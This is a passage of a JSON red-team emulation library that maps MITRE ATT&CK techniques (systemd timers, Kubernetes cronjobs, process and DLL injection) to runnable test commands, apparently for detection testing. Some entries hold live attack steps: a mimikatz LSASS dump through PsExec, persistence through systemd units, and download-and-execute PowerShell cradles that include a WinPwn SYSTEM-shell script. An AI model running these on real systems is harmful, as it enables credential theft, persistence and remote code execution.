        "command": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=RAGLOX Threat Library Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes RAGLOX Threat Library Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n",
        "elevation_required": true,
        "cleanup_command": "systemctl stop #{systemd_timer_name}\nsystemctl disable #{systemd_timer_name}\nrm #{path_to_systemd_service}\nrm #{path_to_systemd_timer}\nsystemctl daemon-reload\n"
      },
      "variables": [
        {
          "name": "path_to_systemd_service",
          "description": "Path to systemd service unit file",
          "type": "path",
          "default_value": "/etc/systemd/system/art-timer.service"
        },
        {
          "name": "path_to_systemd_timer",
          "description": "Path to service timer file",
          "type": "path",
          "default_value": "/etc/systemd/system/art-timer.timer"
        },
        {
          "name": "systemd_service_name",
          "description": "Name of systemd service",
          "type": "string",
          "default_value": "art-timer.service"
        },
        {
          "name": "systemd_timer_name",
          "description": "Name of systemd service timer",
          "type": "string",
          "default_value": "art-timer.timer"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f4983098-bb13-44fb-9b2c-46149961807b",
      "module_name": "Create Systemd Service and Timer"
    },
    {
      "index": 281,
      "technique_id": "T1053.006",
      "technique_name": "Scheduled Task/Job: Systemd Timers",
      "description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "systemd-run --user --unit=RAGLOX-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
        "elevation_required": false,
        "cleanup_command": "systemctl --user stop RAGLOX-Red-Team.service\nsystemctl --user stop RAGLOX-Red-Team.timer\nrm /tmp/log\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if systemd-run exists on the machine\n",
          "check_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Install systemd on the machine.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "3de33f5b-62e5-4e63-a2a0-6fd8808c80ec",
      "module_name": "Create a user level transient systemd service and timer"
    },
    {
      "index": 282,
      "technique_id": "T1053.006",
      "technique_name": "Scheduled Task/Job: Systemd Timers",
      "description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "systemd-run --unit=RAGLOX-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
        "elevation_required": true,
        "cleanup_command": "systemctl stop RAGLOX-Red-Team.service\nsystemctl stop RAGLOX-Red-Team.timer\nrm /tmp/log\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if systemd-run exists on the machine\n",
          "check_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Install systemd on the machine.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "d3eda496-1fc0-49e9-aff5-3bec5da9fa22",
      "module_name": "Create a system level transient systemd service and timer"
    },
    {
      "index": 283,
      "technique_id": "T1053.007",
      "technique_name": "Kubernetes Cronjob",
      "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl get cronjobs -n #{namespace}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "namespace",
          "description": "K8s namespace to list",
          "type": "string",
          "default_value": "default"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed\n",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "ddfb0bc1-3c3f-47e9-a298-550ecfefacbd",
      "module_name": "ListCronjobs"
    },
    {
      "index": 284,
      "technique_id": "T1053.007",
      "technique_name": "Kubernetes Cronjob",
      "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl create -f src/cronjob.yaml -n #{namespace}\n",
        "elevation_required": false,
        "cleanup_command": "kubectl delete cronjob art -n #{namespace}\n"
      },
      "variables": [
        {
          "name": "namespace",
          "description": "K8s namespace to list",
          "type": "string",
          "default_value": "default"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed\n",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "f2fa019e-fb2a-4d28-9dc6-fd1a9b7f68c3",
      "module_name": "CreateCronjob"
    },
    {
      "index": 285,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "txt_path",
          "description": "Path to file containing VBA macro to run",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055\\src\\x64\\T1055-macrocode.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The 64-bit version of Microsoft Office must be installed\n",
          "check_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"
        },
        {
          "description": "\"#{txt_path}\" must exist on disk at specified location\n",
          "check_command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{txt_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"#{txt_path}\" -UseBasicParsing\n"
        }
      ],
      "rx_module_id": "1c91e740-1729-4329-b779-feba6e71d048",
      "module_name": "Shellcode execution via VBA"
    },
    {
      "index": 286,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "machine",
          "description": "machine to target (via psexec)",
          "type": "string",
          "default_value": "DC1"
        },
        {
          "name": "mimikatz_path",
          "description": "Mimikatz windows executable",
          "type": "path",
          "default_value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
        },
        {
          "name": "psexec_path",
          "description": "Path to PsExec",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        },
        {
          "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
          "check_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
        }
      ],
      "rx_module_id": "3203ad24-168e-4bec-be36-f79b13ef8a83",
      "module_name": "Remote Process Injection in LSASS via mimikatz"
    },
    {
      "index": 287,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToRagloxModulesFolder\\T1055\\bin\\x64\\InjectView.exe\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process $notepad.pid"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c6952f41-6cf0-450a-b352-2ca8dae7c178",
      "module_name": "Section View Injection"
    },
    {
      "index": 288,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"$PathToRagloxModulesFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n",
        "elevation_required": false,
        "cleanup_command": "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "variables": [
        {
          "name": "pid",
          "description": "Parent process ID",
          "type": "string",
          "default_value": "(Start-Process calc.exe -PassThru).Id"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "49543237-25db-497b-90df-d0a0a6e8fe2c",
      "module_name": "Dirty Vanity process Injection"
    },
    {
      "index": 289,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.\nThe RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms \nthat relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.\nThe injected shellcode will open a message box and a notepad.\nRWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.\nMore details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.\nThe original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$address = (& \"$PathToRagloxModulesFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToRagloxModulesFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToRagloxModulesFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address\n",
        "elevation_required": true,
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "variables": [
        {
          "name": "vuln_dll",
          "description": "vulnerable DLL",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "Utility to inject must exist on disk at specified location (#{vuln_dll})\n",
          "check_command": "if (Test-Path \"#{vuln_dll}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{vuln_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055/bin/x64/vuln_dll/msys-2.0.dll\" -OutFile \"#{vuln_dll}\"\n"
        }
      ],
      "rx_module_id": "0128e48e-8c1a-433a-a11a-a5387384f1e1",
      "module_name": "Read-Write-Execute process Injection"
    },
    {
      "index": 290,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.\nWith this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread \n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)\n- References: \n  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\n  - https://twitter.com/_CPResearch_/status/1352310521752662018\n  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2315ce15-38b6-46ac-a3eb-5e21abef2545",
      "module_name": "Process Injection with Go using UuidFromStringA WinAPI"
    },
    {
      "index": 291,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call EtwpCreateEtwThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)\n- References: \n  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3\n  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7362ecef-6461-402e-8716-7410e1566400",
      "module_name": "Process Injection with Go using EtwpCreateEtwThread WinAPI"
    },
    {
      "index": 292,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "Executes shellcode in a remote process.\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References: \n  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToRagloxModulesFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "spawn_process_path",
          "description": "Path of the binary to spawn",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\werfault.exe"
        },
        {
          "name": "spawn_process_name",
          "description": "Name of the process spawned",
          "type": "string",
          "default_value": "werfault"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a0c1725f-abcd-40d6-baac-020f3cf94ecd",
      "module_name": "Remote Process Injection with Go using RtlCreateUserThread WinAPI"
    },
    {
      "index": 293,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.\n\nThis application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)\n - References:\n  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToRagloxModulesFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "spawn_process_path",
          "description": "Path of the binary to spawn",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\werfault.exe"
        },
        {
          "name": "spawn_process_name",
          "description": "Name of the process spawned",
          "type": "string",
          "default_value": "werfault"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "69534efc-d5f5-4550-89e6-12c6457b9edd",
      "module_name": "Remote Process Injection with Go using CreateRemoteThread WinAPI"
    },
    {
      "index": 294,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToRagloxModulesFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "spawn_process_path",
          "description": "Path of the binary to spawn",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\werfault.exe"
        },
        {
          "name": "spawn_process_name",
          "description": "Name of the process spawned",
          "type": "string",
          "default_value": "werfault"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39",
      "module_name": "Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)"
    },
    {
      "index": 295,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2871ed59-3837-4a52-9107-99500ebc87cb",
      "module_name": "Process Injection with Go using CreateThread WinAPI"
    },
    {
      "index": 296,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2a3c7035-d14f-467a-af94-933e49fe6786",
      "module_name": "Process Injection with Go using CreateThread WinAPI (Natively)"
    },
    {
      "index": 297,
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "description": "The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread\n\nThe injected shellcode will open a message box and a notepad.\n\nReference to NCC Group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\nConcept from: http://ropgadget.com/posts/abusing_win_functions.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "elevation_required": true,
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "variables": [
        {
          "name": "exe_binary",
          "description": "PE binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055\\bin\\x64\\uuid_injection.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Portable Executable to inject must exist at specified location (#{exe_binary})\n",
          "check_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055/bin/x64/uuid_injection.exe\" -OutFile \"#{exe_binary}\"\n"
        }
      ],
      "rx_module_id": "0128e48e-8c1a-433a-a11a-a5304734f1e1",
      "module_name": "UUID custom process Injection"
    },
    {
      "index": 298,
      "technique_id": "T1055.001",
      "technique_name": "Process Injection: Dynamic-link Library Injection",
      "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process_id",
          "description": "PID of input_arguments",
          "type": "string",
          "default_value": "(Start-Process notepad -PassThru).id"
        },
        {
          "name": "dll_payload",
          "description": "DLL to Inject",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.001\\src\\x64\\T1055.001.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055.001/src/x64/T1055.001.dll\" -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "74496461-11a1-4982-b439-4d87a550d254",
      "module_name": "Process Injection via mavinject.exe"
    },
    {
      "index": 299,
      "technique_id": "T1055.001",
      "technique_name": "Process Injection: Dynamic-link Library Injection",
      "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5",
      "module_name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique"
    },
    {
      "index": 300,
      "technique_id": "T1055.002",
      "technique_name": "Process Injection: Portable Executable Injection",
      "description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"RAGLOX Threat Library\" after a few seconds.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "elevation_required": true,
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "variables": [
        {
          "name": "exe_binary",
          "description": "PE binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.002\\bin\\RedInjection.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Portable Executable to inject must exist at specified location (#{exe_binary})\n",
          "check_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055.002/bin/RedInjection.exe\" -OutFile \"#{exe_binary}\"\n"
        }
      ],
      "rx_module_id": "578025d5-faa9-4f6d-8390-aae739d503e1",
      "module_name": "Portable Executable Injection"
    },
    {
      "index": 301,
      "technique_id": "T1055.003",
